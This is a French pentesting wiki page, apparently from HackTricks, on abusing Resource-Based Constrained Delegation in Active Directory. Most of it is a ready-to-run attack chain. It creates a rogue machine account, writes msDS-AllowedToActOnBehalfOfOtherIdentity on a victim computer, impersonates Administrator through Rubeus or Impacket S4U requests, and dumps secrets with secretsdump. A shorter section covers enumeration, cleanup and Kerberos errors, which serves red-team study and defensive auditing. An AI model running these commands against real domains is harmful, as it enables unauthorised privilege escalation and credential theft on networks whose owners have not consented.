# Délégation Contraignante Basée sur les Ressources

{{#include ../../banners/hacktricks-training.md}}


## Notions de Base de la Délégation Contraignante Basée sur les Ressources

Ceci est similaire à la [Délégation Contraignante](constrained-delegation.md) de base mais **au lieu** de donner des permissions à un **objet** pour **imposer n'importe quel utilisateur contre une machine**. La Délégation Contraignante Basée sur les Ressources **définit** dans **l'objet qui peut imposer n'importe quel utilisateur contre lui**.

Dans ce cas, l'objet contraint aura un attribut appelé _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ avec le nom de l'utilisateur qui peut imposer n'importe quel autre utilisateur contre lui.

Une autre différence importante de cette Délégation Contraignante par rapport aux autres délégations est que tout utilisateur avec **des permissions d'écriture sur un compte machine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) peut définir le **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Dans les autres formes de Délégation, vous aviez besoin de privilèges d'administrateur de domaine).

### Nouveaux Concepts

Dans la Délégation Contraignante, il a été dit que le **`TrustedToAuthForDelegation`** drapeau à l'intérieur de la valeur _userAccountControl_ de l'utilisateur est nécessaire pour effectuer un **S4U2Self.** Mais ce n'est pas complètement vrai.\
La réalité est que même sans cette valeur, vous pouvez effectuer un **S4U2Self** contre n'importe quel utilisateur si vous êtes un **service** (avez un SPN) mais, si vous **avez `TrustedToAuthForDelegation`** le TGS retourné sera **Transférable** et si vous **n'avez pas** ce drapeau, le TGS retourné **ne sera pas** **Transférable**.

Cependant, si le **TGS** utilisé dans **S4U2Proxy** **n'est PAS Transférable**, essayer d'abuser d'une **délégation contraignante de base** **ne fonctionnera pas**. Mais si vous essayez d'exploiter une **délégation contraignante basée sur les ressources, cela fonctionnera**.

### Structure de l'Attaque

> Si vous avez **des privilèges d'écriture équivalents** sur un **compte d'ordinateur**, vous pouvez obtenir **un accès privilégié** sur cette machine.

Supposons que l'attaquant a déjà **des privilèges d'écriture équivalents sur l'ordinateur de la victime**.

1. L'attaquant **compromet** un compte qui a un **SPN** ou **en crée un** (“Service A”). Notez que **tout** _Utilisateur Admin_ sans aucun autre privilège spécial peut **créer** jusqu'à 10 objets d'ordinateur (**_MachineAccountQuota_**) et leur attribuer un **SPN**. Donc, l'attaquant peut simplement créer un objet d'ordinateur et définir un SPN.
2. L'attaquant **abuse de son privilège d'ÉCRITURE** sur l'ordinateur de la victime (ServiceB) pour configurer **la délégation contraignante basée sur les ressources pour permettre à ServiceA d'imposer n'importe quel utilisateur** contre cet ordinateur de la victime (ServiceB).
3. L'attaquant utilise Rubeus pour effectuer une **attaque S4U complète** (S4U2Self et S4U2Proxy) de Service A à Service B pour un utilisateur **avec un accès privilégié à Service B**.
1. S4U2Self (depuis le compte SPN compromis/créé) : Demander un **TGS d'Administrateur pour moi** (Non Transférable).
2. S4U2Proxy : Utiliser le **TGS non Transférable** de l'étape précédente pour demander un **TGS** de **l'Administrateur** au **hôte victime**.
3. Même si vous utilisez un TGS non Transférable, comme vous exploitez la délégation contraignante basée sur les ressources, cela fonctionnera.
4. L'attaquant peut **passer le ticket** et **imposer** l'utilisateur pour obtenir **l'accès au ServiceB de la victime**.

Pour vérifier le _**MachineAccountQuota**_ du domaine, vous pouvez utiliser :
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attaque

### Création d'un objet ordinateur

Vous pouvez créer un objet ordinateur dans le domaine en utilisant **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurer la délégation contrainte basée sur les ressources

**Utilisation du module PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Utilisation de powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Réaliser une attaque S4U complète (Windows/Rubeus)

Tout d'abord, nous avons créé le nouvel objet Ordinateur avec le mot de passe `123456`, donc nous avons besoin du hash de ce mot de passe :
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Cela imprimera les hachages RC4 et AES pour ce compte.\
Maintenant, l'attaque peut être effectuée :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Vous pouvez générer plus de tickets pour plus de services en demandant une seule fois en utilisant le paramètre `/altservice` de Rubeus :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Notez que les utilisateurs ont un attribut appelé "**Cannot be delegated**". Si un utilisateur a cet attribut à True, vous ne pourrez pas l'imiter. Cette propriété peut être vue dans BloodHound.

### Outils Linux : RBCD de bout en bout avec Impacket (2024+)

Si vous opérez depuis Linux, vous pouvez effectuer la chaîne RBCD complète en utilisant les outils officiels d'Impacket :
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- Si la signature LDAP/LDAPS est appliquée, utilisez `impacket-rbcd -use-ldaps ...`.
- Préférez les clés AES ; de nombreux domaines modernes restreignent RC4. Impacket et Rubeus prennent tous deux en charge les flux uniquement AES.
- Impacket peut réécrire le `sname` ("AnySPN") pour certains outils, mais obtenez le SPN correct chaque fois que possible (par exemple, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Accès

La dernière ligne de commande effectuera la **complète attaque S4U et injectera le TGS** de l'Administrateur vers l'hôte victime en **mémoire**.\
Dans cet exemple, un TGS pour le service **CIFS** a été demandé par l'Administrateur, vous pourrez donc accéder à **C$** :
```bash
ls \\victim.domain.local\C$
```
### Abuser différents tickets de service

Apprenez-en plus sur les [**tickets de service disponibles ici**](silver-ticket.md#available-services).

## Énumération, audit et nettoyage

### Énumérer les ordinateurs avec RBCD configuré

PowerShell (décodage du SD pour résoudre les SID) :
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (lire ou vider avec une seule commande) :
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Nettoyage / réinitialisation RBCD

- PowerShell (effacer l'attribut) :
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Erreurs Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`** : Cela signifie que kerberos est configuré pour ne pas utiliser DES ou RC4 et que vous ne fournissez que le hachage RC4. Fournissez à Rubeus au moins le hachage AES256 (ou fournissez-lui simplement les hachages rc4, aes128 et aes256). Exemple : `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`** : Cela signifie que l'heure de l'ordinateur actuel est différente de celle du DC et que kerberos ne fonctionne pas correctement.
- **`preauth_failed`** : Cela signifie que le nom d'utilisateur + les hachages fournis ne fonctionnent pas pour se connecter. Vous avez peut-être oublié de mettre le "$" dans le nom d'utilisateur lors de la génération des hachages (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** : Cela peut signifier :
  - L'utilisateur que vous essayez d'imiter ne peut pas accéder au service souhaité (parce que vous ne pouvez pas l'imiter ou parce qu'il n'a pas suffisamment de privilèges)
  - Le service demandé n'existe pas (si vous demandez un ticket pour winrm mais que winrm n'est pas en cours d'exécution)
  - L'ordinateur fictif créé a perdu ses privilèges sur le serveur vulnérable et vous devez les lui redonner.
  - Vous abusez du KCD classique ; rappelez-vous que RBCD fonctionne avec des tickets S4U2Self non transférables, tandis que KCD nécessite des tickets transférables.

## Notes, relais et alternatives

- Vous pouvez également écrire le SD RBCD sur les services Web AD (ADWS) si LDAP est filtré. Voir :

{{#ref}}
adws-enumeration.md
{{#endref}}

- Les chaînes de relais Kerberos se terminent souvent par RBCD pour atteindre le SYSTEM local en une seule étape. Voir des exemples pratiques de bout en bout :

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Références

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (officiel) : https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/

{{#include ../../banners/hacktricks-training.md}}
